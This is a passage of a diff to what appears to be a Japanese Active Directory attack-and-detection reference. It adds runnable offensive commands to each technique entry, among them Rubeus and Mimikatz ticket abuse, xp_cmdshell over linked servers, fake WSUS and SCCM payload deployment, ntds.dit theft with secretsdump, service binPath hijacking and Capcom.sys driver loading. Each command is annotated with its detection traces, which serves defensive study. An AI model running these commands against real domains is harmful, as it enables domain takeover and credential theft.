+        "t": "取得済みチケットのsname/SPNを別サービス名へ置換。同一セッション鍵のチケットが複数サービスに現れる不自然さが手掛かり",
+        "q": "Rubeus.exe tgssub /ticket:ticket.kirbi /altservice:ldap/dc01.corp.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "S4U2self+U2Uを組み合わせ特権ユーザーのPAC付きTGSを取得。攻撃元プロセスログは無くDCの4769のみが手掛かり",
+        "q": "getST.py -u2u -impersonate administrator -spn cifs/dc01.corp.local corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "取得したU2Uチケットを現在のセッションへ注入する定番コマンド。以降の認証がPtT由来かはチケット有効期限の不整合で判別する",
+        "q": "mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit"
+      }
+    ],
     "detect": "U2Uを示すKerberosチケット要求(TGS-REQのENC-TKT-IN-SKEYフラグ)や、S4U2selfとU2Uを組み合わせた異常なチケット取得を検知する。特権ユーザPACを含むTGSの異常発行、Sapphire Ticket兆候を監視する。",
     "events": "4769 (TGS要求, U2Uフラグ), 4768, PAC検証関連",
     "mitigate": "AES暗号の強制とKerberosアーマリング(FAST)を導入し、特権アカウントをProtected Usersに配置する。KRBTGT定期ローテーション、異常チケット検知(PAC不整合)を運用する。",
@@ -7192,6 +11819,38 @@ AD.I18N.ja.attacks = [
     "summary": "リンクサーバ連鎖による横断、EXECUTE AS/TRUSTWORTHYによるDBインパーソネーション、xp_cmdshellでのOSコマンド実行という主要な横展開・特権昇格手法群。",
     "how": "MSSQLへ低権限ログインでアクセス後、リンクサーバ(OPENQUERY連鎖)を辿って他インスタンスへ横断し、遠隔でsysadmin実行する。TRUSTWORTHY ON DBのdb_ownerからEXECUTE AS OWNER→sysadmin昇格、またはEXECUTE AS LOGINでの偽装を行い、最終的にxp_cmdshell/OLE Automation/sp_OACreateやCLRアセンブリでOSコマンドをSQLサービスアカウント権限で実行する。",
     "tools": "PowerUpSQL, mssqlclient.py(impacket), SQLRecon, Chisel/xp_cmdshell",
+    "cmd": [
+      {
+        "tool": "PowerUpSQL",
+        "t": "リンクサーバを再帰的に辿りOPENQUERY連鎖でxp_cmdshellを実行。`Get-SQLServerLinkCrawl`と`OPENQUERY`の入れ子がSQL監査ログの決定的シグナル",
+        "q": "Get-SQLServerLinkCrawl -Instance dc01.corp.local -Query \"exec master..xp_cmdshell 'whoami'\""
+      },
+      {
+        "tool": "PowerUpSQL",
+        "t": "SPNからドメイン内のSQLインスタンスを列挙する事前偵察。単体では正規棚卸しと紛れるため後続のログイン試行と相関させる",
+        "q": "Get-SQLInstanceDomain -DomainController dc01.corp.local -CheckMgmt"
+      },
+      {
+        "tool": "SQLRecon",
+        "t": "到達可能なリンクサーバを一覧化。`/m:Links`実行の直後に`/m:XpCmd`が続けば横断成立の強い兆候",
+        "q": "SQLRecon.exe /h:dc01.corp.local /a:windows /m:Links"
+      },
+      {
+        "tool": "SQLRecon",
+        "t": "EXECUTE AS可能なログインへ偽装。`/m:Impersonate`成功はDB監査の権限昇格イベントとして記録される",
+        "q": "SQLRecon.exe /h:dc01.corp.local /a:windows /m:Impersonate"
+      },
+      {
+        "tool": "mssqlclient.py",
+        "t": "Linux側からTDS(1433)で対話シェル接続。直後の`enable_xp_cmdshell`と`xp_cmdshell`実行が横展開の決定打",
+        "q": "mssqlclient.py corp.local/svc_user:'Passw0rd!'@10.0.0.10 -windows-auth"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "多段リンクサーバ越しに一文でxp_cmdshellへ到達する入れ子OPENQUERY。ネストした引用符の連続がSQL監査ログの指紋",
+        "q": "SELECT * FROM OPENQUERY([LINKEDSRV], 'EXEC xp_cmdshell ''whoami''')"
+      }
+    ],
     "detect": "SQL監査でxp_cmdshell有効化・実行、リンクサーバ経由のクロスサーバクエリ、EXECUTE AS/IMPERSONATE使用を検知する。SQLサービスアカウントによる予期しない子プロセス(cmd.exe/powershell.exe)をEDRで監視する。",
     "events": "SQL Server監査 (xp_cmdshell実行, IMPERSONATE), Sysmon 1 (sqlservr.exe子プロセス), 4688",
     "mitigate": "xp_cmdshell/OLE Automationを無効化しCLR strict securityを有効にする。リンクサーバのリモートログインを最小権限マッピングに、TRUSTWORTHYをOFF、SQLサービスアカウントを非特権のgMSAにする。ネットワークでSQL間通信を制限する。",
@@ -7232,6 +11891,38 @@ AD.I18N.ja.attacks = [
     "summary": "WSUSサーバを掌握し承認済み更新として署名済みバイナリ(PsExec等)を配下端末に配布・実行して横展開する手法。",
     "how": "WSUSサーバ(またはそのSUSDB)へアクセス後、SharpWSUS/WSUSpenduでMicrosoft署名済みバイナリ(psexec.exe等)をコマンドライン引数付きの偽更新として登録・承認し、対象コンピュータへ配布する。WSUSがHTTP(署名検証は署名者のみ)で配信する構成やインジェクション可能な承認を悪用し、クライアント上でSYSTEM実行に至る。サーバ掌握の前段として、近年はCVE-2025-59287(WSUS未認証RCE, CVSS9.8, GetCookie/ReportingWebServiceでのBinaryFormatter/SoapFormatterの安全でない逆シリアル化)を用い、既定ポート8530/8531に露出したWSUSをw3wp.exe/wsusservice.exe経由でSYSTEM掌握する初期アクセスが2025年10月以降実際に悪用されており(CISA KEV登載)、無認証で本手法の前提を満たす。",
     "tools": "SharpWSUS, WSUSpendu, PyWSUS(HTTP中間者), PsExec(ペイロード)",
+    "cmd": [
+      {
+        "tool": "SharpWSUS",
+        "t": "悪性ペイロードを正規更新として登録。`/payload``/args``/title`の組合せがWSUS管理コンソールとSUSDBの双方に残る",
+        "q": "SharpWSUS.exe create /payload:\"C:\\Windows\\Temp\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"whoami\\\"\" /title:\"2024-11 Security Update\" /date:2024-11-01 /kb:5031234 /rating:Important /description:\"Security Update\" /url:\"https://microsoft.com\""
+      },
+      {
+        "tool": "SharpWSUS",
+        "t": "特定端末1台のみへ偽更新を承認。`/computername`指定の単体承認は正規のグループ配信と異なる強い異常シグナル",
+        "q": "SharpWSUS.exe approve /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:workstation1.corp.local"
+      },
+      {
+        "tool": "SharpWSUS",
+        "t": "対象端末での適用状況を確認する後処理。直前の`create``approve`との時系列相関で悪性配信と判断できる",
+        "q": "SharpWSUS.exe check /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:workstation1.corp.local"
+      },
+      {
+        "tool": "WSUSpendu",
+        "t": "PowerShell単体でWSUSに偽更新を直接注入。4104のスクリプトブロックに`Wsuspendu``-Inject``-PayloadFile`が残る",
+        "q": "Wsuspendu.ps1 -Inject -PayloadFile psexec.exe -PayloadArgs '-accepteula -s -d cmd.exe /c \"whoami\"' -ComputerName workstation1.corp.local"
+      },
+      {
+        "tool": "WSUSpendu",
+        "t": "注入済み更新の適用結果を確認。`-Check`と`-UpdateID`の組合せがWSUSpendu特有の呼び出しパターン",
+        "q": "Wsuspendu.ps1 -Check -UpdateID 9e21a26a-1cbe-4145-934e-d8395acba567 -ComputerName workstation1.corp.local"
+      },
+      {
+        "tool": "psexec.exe",
+        "t": "配信されたペイロードが端末上でSYSTEM実行される最終痕跡。WSUSエージェント配下からの`psexec`起動が決め手",
+        "q": "psexec.exe -accepteula -s -d cmd.exe /c whoami"
+      }
+    ],
     "detect": "SUSDBへの直接書込、想定外の手動承認更新、配布バイナリのコマンドライン引数を含む更新をWSUS/イベントログで検知する。クライアント側でwuauclt/TiWorker由来のpsexec等の実行、SYSTEMでの異常プロセスを監視する。",
     "events": "WSUSイベントログ, SUSDB監査, Sysmon 1 (wuauclt→psexec等), 4688",
     "mitigate": "WSUS配信をHTTPS+TLSにし、WSUSサーバをTier0資産として保護する。SUSDBへのアクセス制限、更新承認の職務分掌、WSUSサーバの管理者最小化を行う。CVE-2025-59287はMicrosoftの2025年10月OOB更新(10月定例の不完全修正後に配信)を即時適用して解消し、8530/8531のインターネット露出を遮断する。WSUSはWindows Server 2025で非推奨化(2024年9月告知・機能開発停止/現状維持のみ)されており、Windows Autopatch/Intune等の新配信基盤への移行を計画する。",
@@ -7267,6 +11958,38 @@ AD.I18N.ja.attacks = [
     "summary": "SCCMの正規アプリ/スクリプト配布機能を悪用し、フルアドミン権限からコレクション内端末でSYSTEM権限のペイロードを実行する横展開。",
     "how": "SCCMのFull Administratorまたは相当権限を得た後、SharpSCCMやAdminServiceでデバイス/コレクションに対しアプリ配布やCMScriptsの即時実行を作成し、ターゲット端末のSCCMクライアント(ccmexec, SYSTEM)にペイロードを実行させる。正規の管理経路を使うためEDRで正常運用と紛れやすい。初期アクセスとして、未認証のCVE-2024-43468(MP_Locationサービスの未認証SQLi, CVSS9.8)でサイトDBにxp_cmdshell/sysadminを得てサイトを掌握し、そこからFull Administrator相当を確立する経路も観測されている。",
     "tools": "SharpSCCM (invoke), sccmhunter (exec), AdminService API, CMPivot/Scripts",
+    "cmd": [
+      {
+        "tool": "MalSCCM",
+        "t": "UNCパス上の任意ペイロードを指すアプリケーションを新規作成。`app /create`と`/uncpath`がAdminService経由の作成ログに残る",
+        "q": "MalSCCM.exe app /create /name:Updater /uncpath:\"\\\\10.0.0.5\\share\\payload.msi\""
+      },
+      {
+        "tool": "MalSCCM",
+        "t": "対象端末のみを含む一時デバイスコレクションを新規作成。`group /create`と`/grouptype:device`が展開範囲限定の指紋",
+        "q": "MalSCCM.exe group /create /groupname:Targets /grouptype:device"
+      },
+      {
+        "tool": "MalSCCM",
+        "t": "作成した一時グループへ対象端末を追加。個別ホスト名を明示する`/addhost`が広域配布との違いを示す",
+        "q": "MalSCCM.exe group /addhost /groupname:Targets /host:workstation1"
+      },
+      {
+        "tool": "MalSCCM",
+        "t": "作成済みアプリを対象コレクションへ必須配備。SYSTEM権限のccmexec経由で全端末に強制インストールされる決定打",
+        "q": "MalSCCM.exe app /deploy /name:Updater /groupname:Targets /assignmentname:Update1"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "偽の配布点からのクライアントプッシュインストールを強制し対象端末からNTLM認証を引き出す。`client-push`が固有語",
+        "q": "SharpSCCM.exe invoke client-push /target:10.0.0.50 /smbserver:10.0.0.5"
+      },
+      {
+        "tool": "Invoke-CMScript",
+        "t": "正規のスクリプト配布機能を悪用しSYSTEM権限で任意コマンドを実行。署名済みコンソールcmdletのため実行ファイル検知は効かない",
+        "q": "Invoke-CMScript -ScriptGuid \"DF8E7546-FD66-4A3D-A129-53AF5AA54F80\" -CollectionName \"All Systems\""
+      }
+    ],
     "detect": "SCCMコンソール外/非承認オペレータによるアプリ配布・スクリプト実行の作成、短命の配布と即時展開をSCCM監査/AdminServiceログで検知する。クライアントでccmexec→cmd/powershellの異常な子プロセスを監視する。",
     "events": "SCCM監査状態メッセージ, AdminServiceログ, Sysmon 1 (ccmexec.exe子プロセス), 4688",
     "mitigate": "SCCMのRBAC(役割)を最小化しFull Administratorを厳格管理する。スクリプト実行の承認(承認者分離)を有効化、サイトサーバ/SMSプロバイダをTier0で保護、配布作成を監査アラート化する。",
@@ -7302,6 +12025,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象ユーザのprimaryGroupIDを512/519/518等に書き換え、group member属性を汚さずに特権グループの実効所属を得るステルス特権昇格手法。",
     "how": "対象ユーザオブジェクトへの書込権限(GenericWrite等)がある場合、primaryGroupID属性をDomain Admins(512)やEnterprise Admins(519)等のドメイングローバル特権グループのRIDに書き換える(primaryGroupIDはドメイン相対RIDのみ格納でき、544=BUILTIN Administrators等のドメインローカル群は指定不可)。primaryGroupベースの所属はグループのmember属性に現れないため、通常のグループメンバー監査では検出されにくく、実効的に特権グループの権限を得る。",
     "tools": "PowerView (Set-DomainObject), ldapmodify, ADSI/Set-ADUser",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "primaryGroupIDをDomain Admins(512)へ書換え。member属性は変化せずグループメンバー監査をすり抜ける、5136のprimaryGroupID変更が唯一の痕跡",
+        "q": "Set-DomainObject -Identity svc_user -Set @{primarygroupid='512'}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "正規ADモジュールでの書換のため実行ファイル検知が効かない。4104に`Set-ADUser`呼出しとprimaryGroupIDの新値が残る",
+        "q": "Set-ADUser -Identity svc_user -Replace @{primaryGroupID=512}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "Linux側から直接属性上書き。端末側テレメトリはなくLDAPの5136のみで検知する",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' set object svc_user primaryGroupID -v 512"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "生LDAPでの属性書換。ldif自体はログに残らず実行コマンドラインと直後の5136差分のみが手掛かり",
+        "q": "ldapmodify -x -D 'attacker@corp.local' -w 'Passw0rd!' -h dc01.corp.local -f primarygroupid.ldif"
+      }
+    ],
     "detect": "ユーザ/コンピュータのprimaryGroupID変更(5136)を検知し、512/519/518/516等の特権RID(544等のBUILTINドメインローカルRIDはprimaryGroupIDに設定不可)への変更を即時アラートする。特権グループの実効メンバーをprimaryGroupID込みで棚卸しする。",
     "events": "5136 (primaryGroupID属性変更), 4738 (user account changed), 4662",
     "mitigate": "特権オブジェクトへの書込ACLを最小化しGenericWrite等の過剰委任を除去する。primaryGroupID変更をSIEMで監視、AdminSDHolder保護対象を確認し、実効メンバー監査を定期化する。",
@@ -7337,6 +12082,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象のuserAccountControlへの書込みで非制約委任(TRUSTED_FOR_DELEGATION)付与やパスワード不要化等のUACビットを悪用する特権化手法(DONT_REQ_PREAUTH以外)。",
     "how": "書込権限だけで可能なPASSWD_NOTREQD(0x20)でパスワードなし認証を許可、DONT_REQ_PREAUTHでAS-REP Roast可能化、DONT_EXPIRE_PASSWDで永続化する。※TRUSTED_FOR_DELEGATION(0x80000)による非制約委任の新設はDC側でSeEnableDelegationPrivilege(通常DA相当のみ)を要求されるため、汎用の書込権限だけでは不可。UACビット単位で多様な悪用が可能。",
     "tools": "PowerView (Set-DomainObject useraccountcontrol), bloodyAD, ldapmodify, Rubeus(委任悪用)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "PASSWD_NOTREQD(0x20=32)を付与しパスワード無し認証を許可。5136のuserAccountControl変更が痕跡",
+        "q": "Set-DomainObject -Identity svc_user -XOR @{useraccountcontrol=32}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "パスワード無期限化で永続化。`add uac`と`-f`に続くフラグ名がそのまま検知文字列になる",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' add uac svc_user -f DONT_EXPIRE_PASSWD"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "空/任意パスワードでの認証を許可するビットを追加。直後に同アカウントでのログオン試行が続けば強いシグナル",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' add uac svc_user -f PASSWD_NOTREQD"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "生LDAPでのUACビット書換。実行コマンドラインよりも直後のuserAccountControl差分(5136)で捕捉する",
+        "q": "ldapmodify -x -D 'attacker@corp.local' -w 'Passw0rd!' -h dc01.corp.local -f uac.ldif"
+      }
+    ],
     "detect": "userAccountControl変更(5136/4738/4742)で特にTRUSTED_FOR_DELEGATIONビットの付与、PASSWD_NOTREQD設定を即時検知する。非DCオブジェクトへの非制約委任付与は高リスクとしてアラートする。",
     "events": "4738/4742 (UAC変更), 5136 (userAccountControl属性), 4662",
     "mitigate": "オブジェクトへの書込ACLを最小化し、非制約委任の新設を監視・禁止する。特権/機微アカウントをProtected Users・「アカウントは委任できない(NOT_DELEGATED)」に設定、UAC変更を監査アラート化する。",
@@ -7377,6 +12144,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象アカウントのmsDS-AllowedToDelegateTo属性へ書込んで制約委任(KCD)経路を新設し、protocol transition付きでS4U経由の任意ユーザ偽装を得る書込エッジ。",
     "how": "対象アカウントへの書込権限がある場合、msDS-AllowedToDelegateToに標的SPN(例: cifs/dc)を追加し、userAccountControlにTRUSTED_TO_AUTH_FOR_DELEGATION(protocol transition)を付与する(※このビット付与にはSeEnableDelegationPrivilegeが必要で通常はDA相当のみ。書込エッジ単独で得られるのはKerberosのみ=protocol transition無しの制約委任)。制御下アカウントからS4U2self+S4U2proxyで任意ユーザ(DA含む)を偽装したサービスチケットを取得し標的サービスへアクセスする。",
     "tools": "PowerView (Set-DomainObject), Rubeus (s4u), impacket (getST -impersonate), bloodyAD",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "対象アカウントのmsDS-AllowedToDelegateToへSPNを追加し制約委任経路を新設。5136(対象属性名がmsDS-AllowedToDelegateTo)が決定的",
+        "q": "Set-DomainObject -Identity svc01 -Set @{'msds-allowedtodelegateto'='cifs/dc01.corp.local'}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "同属性をbloodyADで直接書込む代替経路。`set object`サブコマンドと属性名の組合せがコマンドラインに残る",
+        "q": "bloodyAD -d corp.local -u svc_user -p 'Passw0rd!' --host dc01.corp.local set object 'svc01$' msDS-AllowedToDelegateTo -v 'cifs/dc01.corp.local'"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "新設した委任経路でS4U2Self+Proxyを実行し任意ユーザーを偽装。protocol transitionビットが無ければS4U2Selfが失敗する",
+        "q": "Rubeus.exe s4u /user:svc01 /rc4:aabbccddeeff00112233445566778899 /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側でS4U連鎖を実行しSTを取得。属性書込みから直後のTGS要求までの時間差が短いほど攻撃的",
+        "q": "getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc01:'Passw0rd!'"
+      }
+    ],
     "detect": "msDS-AllowedToDelegateTo属性の変更(5136)とTRUSTED_TO_AUTH_FOR_DELEGATIONビット付与を検知する。異常なS4U2self/S4U2proxyチケット要求(4769の委任フラグ、偽装ユーザとサービスの組合せ)を監視する。",
     "events": "5136 (msDS-AllowedToDelegateTo変更), 4738/4742, 4769 (S4U TGS)",
     "mitigate": "委任属性への書込ACLを最小化し、KCDの新設を監査アラート化する。機微アカウントはProtected Users/委任禁止に、委任先SPNの棚卸しと最小化、AESとFAST導入を行う。",
@@ -7417,6 +12206,33 @@ AD.I18N.ja.attacks = [
     "summary": "Backup OperatorsのSeBackupPrivilege/SeRestorePrivilegeを合法的に用いてDCのNTDS.dit・レジストリを取得しドメイン全体を侵害する組込グループ悪用。",
     "how": "Backup Operatorsメンバーはネットワーク経由でDCにログオンしSeBackupPrivilegeでNTDS.ditとSYSTEMハイブをコピー(diskshadow/esentutl/robocopy /b)、またはリモートレジストリでSAM/SECURITYを保存する。得たハイブからsecretsdumpで全ドメインハッシュ(krbtgt含む)を抽出しDCSync相当のドメイン侵害に至る。SeRestorePrivilegeでバイナリ差替による昇格も可能。",
     "tools": "diskshadow, esentutl, robocopy /b, reg save, impacket-secretsdump, SeBackupPrivilegeCmdLets",
+    "cmd": [
+      {
+        "tool": "diskshadow.exe",
+        "t": "スクリプトを流し込みシャドウコピーを作成しロック中のntds.ditを読取可能にする準備段階。`diskshadow.exe /s` とスクリプトファイル指定の組合せが痕跡",
+        "q": "diskshadow.exe /s C:\\Windows\\Temp\\backup.dsh"
+      },
+      {
+        "tool": "robocopy",
+        "t": "シャドウ公開ドライブからntds.ditを`/b`(バックアップモード)でコピー。robocopyの`/b`とntds.dit指定の組合せは通常運用とまず重ならない高精度シグナル",
+        "q": "robocopy.exe /b E:\\Windows\\NTDS C:\\Windows\\Temp ntds.dit"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SeBackupPrivilegeでSYSTEM/SAMハイブを直接保存。`reg save`と`hklm\\system`/`hklm\\sam`の組合せは通常運用でまず出ない",
+        "q": "reg.exe save hklm\\system C:\\Windows\\Temp\\system.hive\nreg.exe save hklm\\sam C:\\Windows\\Temp\\sam.hive"
+      },
+      {
+        "tool": "SeBackupPrivilege",
+        "t": "専用cmdletでSeBackupPrivilegeを有効化しファイルコピーAPIを直接呼ぶ。4104のスクリプトブロックに`Copy-FileSeBackupPrivilege`の関数名が残る",
+        "q": "Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit -Overwrite"
+      },
+      {
+        "tool": "Impacket",
+        "t": "持ち出したハイブをオフライン解析しkrbtgt含む全ハッシュを復元。Linux側実行のため端末側にはプロセスログが一切残らない",
+        "q": "secretsdump.py -sam sam.hive -system system.hive -ntds ntds.dit LOCAL"
+      }
+    ],
     "detect": "Backup Operatorsメンバーのメンバーシップ変更(4732)とDCへの対話/ネットワークログオン、NTDS.ditへのアクセスを検知する。バックアップ製品以外によるSeBackupPrivilege行使、diskshadow起動を監視する。",
     "events": "4732 (グループ追加), 4672 (特権割当), 4663 (ntds.dit), Sysmon 1 (diskshadow/esentutl)",
     "mitigate": "Backup OperatorsをTier0扱いしメンバーを排除/最小化、バックアップは専用の限定権限で行う。DCへのログオン権限を分離し、NTDS.ditアクセス監査、AdminSDHolder保護を確認する。",
@@ -7457,6 +12273,28 @@ AD.I18N.ja.attacks = [
     "summary": "Server OperatorsがDC上のサービス構成(binPath)を変更してSYSTEM権限で任意コマンドを実行し、ドメインを掌握する組込グループ悪用。",
     "how": "Server OperatorsはDC上のサービスを管理できるため、sc config <service> binPath= で既存サービス(例: 停止中のサービス)のバイナリパスを攻撃者コマンドに書換え、サービス再起動でLocalSystemとして実行する。DC上でSYSTEMを得ればNTDS抽出やkrbtgt奪取に直結する。SeBackupPrivilege等も併せ持つ。",
     "tools": "sc.exe (config/start), NetExec, PsExec, services.msc相当API",
+    "cmd": [
+      {
+        "tool": "sc.exe",
+        "t": "改変前の下調べでサービス構成を確認。単体では正規運用と区別できないため直後の`config`書換えと相関させて見る",
+        "q": "sc.exe qc VSS"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "既存サービスのbinPathを攻撃者コマンドへ書換え。Server OperatorsはSCM上の新規サービス作成権を持たず既存サービスのWP権のみのため対象は稼働/停止中の既存サービスに限られる",
+        "q": "sc.exe config VSS binPath= \"cmd.exe /c net localgroup administrators corp\\svc_user /add\""
+      },
+      {
+        "tool": "sc.exe",
+        "t": "改変後にサービスを再起動しSYSTEM権限で新binPathを実行させる。`config`直後の`stop`/`start`連続は強いシグナル",
+        "q": "sc.exe stop VSS\nsc.exe start VSS"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "WMI経由でも同じChangeServiceConfig APIに到達しSCMの権限チェックを同様に通過する亜種。WmiPrvSE.exeの子プロセスとして現れsc.exeを使わない",
+        "q": "Invoke-CimMethod -ClassName Win32_Service -Filter \"Name='VSS'\" -MethodName Change -Arguments @{PathName='cmd.exe /c net localgroup administrators corp\\svc_user /add'}"
+      }
+    ],
     "detect": "DC上のサービスbinPath変更(4697 サービスインストール/変更, 7045)、Server Operatorsによる操作を検知する。既存サービスのイメージパスが非標準バイナリ/cmd/powershellに変わった事象を監視する。",
     "events": "4697/7045 (サービス変更・インストール), 4732 (グループ追加), 4672",
     "mitigate": "Server Operatorsをメンバー0に維持しTier0で厳格管理する。DC上のサービス変更を監査、特権グループのメンバーシップ変更をアラート化、AdminSDHolder保護を確認する。",
@@ -7492,6 +12330,33 @@ AD.I18N.ja.attacks = [
     "summary": "Account Operatorsが非保護(non-protected)ユーザ・グループを作成・改変できる権限を悪用し、資格情報リセットやグループ操作で横展開・昇格する組込グループ悪用。",
     "how": "Account OperatorsはAdminSDHolder保護外の一般ユーザ/グループの作成・削除・パスワードリセット・メンバー変更が可能。ターゲットユーザのパスワードをリセットしてアカウントを乗っ取る、あるいは制御可能な委任グループ(GPO編集権を持つグループ等)へ自分を追加してACL経由の昇格に繋げる。DA等の保護グループは直接操作不可だが、そこへ至る非保護オブジェクトを踏み台にする。",
     "tools": "net user/group, PowerView, bloodyAD, Set-ADAccountPassword",
+    "cmd": [
+      {
+        "tool": "net.exe",
+        "t": "非保護(AdminSDHolder対象外)ユーザのパスワードをリセットしアカウントを乗っ取る。保護グループメンバー相手には権限不足で失敗する",
+        "q": "net.exe user svc_target Passw0rd! /domain"
+      },
+      {
+        "tool": "net.exe",
+        "t": "GPO編集権等を持つ非保護の委任グループへ自身を追加しACL経由の昇格へ繋げる。Domain Admins等の保護グループへの追加はAdminSDHolderで拒否される",
+        "q": "net.exe group \"GPO Admins\" svc_user /add /domain"
+      },
+      {
+        "tool": "ActiveDirectory",
+        "t": "RSATモジュールでの同等のパスワードリセット。PowerShellログ4103/4104に`Set-ADAccountPassword`の呼び出しが残る",
+        "q": "Set-ADAccountPassword -Identity svc_target -Reset -NewPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerView版のパスワードリセット。4104のスクリプトブロックに`Set-DomainUserPassword`の関数名が残る",
+        "q": "Set-DomainUserPassword -Identity svc_target -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "Linux側からLDAP経由で直接パスワードを書換え。端末プロセスログは残らずDC側の4724/5136の相関でしか追えない",
+        "q": "bloodyAD --host dc01.corp.local -d corp.local -u svc_user -p 'Passw0rd!' set password svc_target 'NewPassw0rd!'"
+      }
+    ],
     "detect": "Account Operatorsによるパスワードリセット(4724)、ユーザ/グループ作成・変更(4720/4728/4732/4738)を検知する。非保護だが実効的に強い委任グループへのメンバー追加を監視する。",
     "events": "4724 (パスワードリセット), 4720/4738 (ユーザ作成/変更), 4728/4732 (グループ追加)",
     "mitigate": "Account Operatorsをメンバー0にし委任は個別のカスタムACLで代替する。委任グループのネストと権限を棚卸しし、機微グループをAdminSDHolder相当で保護、リセット/追加操作を監査アラート化する。",
@@ -7527,6 +12392,28 @@ AD.I18N.ja.attacks = [
     "summary": "Print OperatorsのSeLoadDriverPrivilegeを悪用して署名済み脆弱ドライバをロード(BYOVD)し、カーネル権限でローカルSYSTEM/DC昇格を得る組込グループ悪用。",
     "how": "Print OperatorsはSeLoadDriverPrivilegeを持ち、NtLoadDriver経由でユーザ指定のドライバをロードできる。Capcom.sysやその他の署名済み脆弱ドライバ(BYOVD)をロードして任意カーネルコード実行→SYSTEM昇格に至る。Print OperatorsはDCへのログオンも許されるためDC上でのSYSTEM取得に直結しうる。",
     "tools": "EoPLoadDriver, Capcom.sys, その他BYOVDドライバ, SeLoadDriverPrivilege PoC",
+    "cmd": [
+      {
+        "tool": "sc.exe",
+        "t": "既存ロード済みドライバの一覧を確認しBYOVD対象の空き名や衝突を事前チェックする下調べ",
+        "q": "sc.exe query type= driver state= all"
+      },
+      {
+        "tool": "EoPLoadDriver",
+        "t": "SeLoadDriverPrivilegeでNtLoadDriverを直接呼びSCMのサービス作成ACLを回避する専用PoC。第1引数のレジストリサービスパスと第2引数の.sysが対で残る",
+        "q": "EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\Windows\\Temp\\Capcom.sys"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "手動運用時にロード前段としてServicesキー配下へImagePathとType(=1=kernel)を直接書込む変種。怪しいImagePathとType=1の組合せが手掛かり",
+        "q": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\CapcomSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\Capcom.sys /f\nreg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\CapcomSvc /v Type /t REG_DWORD /d 1 /f"
+      },
+      {
+        "tool": "driverquery.exe",
+        "t": "ロード成功を確認する正規LOLBin。直前の不審な未署名/脆弱ドライバファイル名の出現と合わせて見る",
+        "q": "driverquery.exe /v /fo csv"
+      }
+    ],
     "detect": "SeLoadDriverPrivilegeの行使、非標準ドライバのロード(Sysmon 6 driver load, 署名/ハッシュ)、既知脆弱ドライバのロードを検知する。Print Operatorsメンバーの操作とドライバロードを相関する。",
     "events": "Sysmon 6 (driver load), 4673/4674 (特権使用), 4732 (グループ追加), 7045",
     "mitigate": "Print Operatorsをメンバー0にする。Microsoft Vulnerable Driver Blocklist(HVCI/WDAC)を有効化しBYOVDを封じ、ドライバロードを許可リスト化、DCへのログオン権限を分離する。",
@@ -7567,6 +12454,23 @@ AD.I18N.ja.attacks = [
     "summary": "DnsAdminsがDNSサービスにServerLevelPluginDll値で任意DLLをロードさせDC上でSYSTEM権限のコード実行を得る古典的特権昇格。CVE-2021-40469として2021年10月更新で緩和され、当該値はDnsAdminsでは書けない管理者専用のInternalParametersキーへ移設された。よってパッチ適用済みDCではDnsAdmins単独では成立せず、主に未適用・レガシDCか、既にDC管理者権限を得た攻撃者の持続化手段として位置づける。",
     "how": "DnsAdminsメンバーはdnscmd <dc> /config /serverlevelplugindll \\\\attacker\\share\\evil.dll でDNSサーバに任意DLLパスを設定でき、DNSサービス(dns.exe, SYSTEM)再起動時にそのDLLがロードされSYSTEMでコード実行される。DNSはDC上で稼働することが多くDC侵害・ドメイン掌握に直結する。ただしCVE-2021-40469に対する2021年10月の修正で、DNSサービスが参照するServerLevelPluginDll値はHKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parametersから管理者のみ書込可能なInternalParametersキーへ移された。パッチ適用済みDCではDnsAdminsは旧Parametersキーに書けても実際にはロードされず、悪用にはDC管理者権限が必要。したがって現行環境では未適用DC/レガシOSか、既にDC管理者を得た攻撃者の持続化手段として扱う。",
     "tools": "dnscmd, DNSAdmin-DLL(msfvenom DLL), NetExec, PowerShell (DnsServer module)",
+    "cmd": [
+      {
+        "tool": "dnscmd.exe",
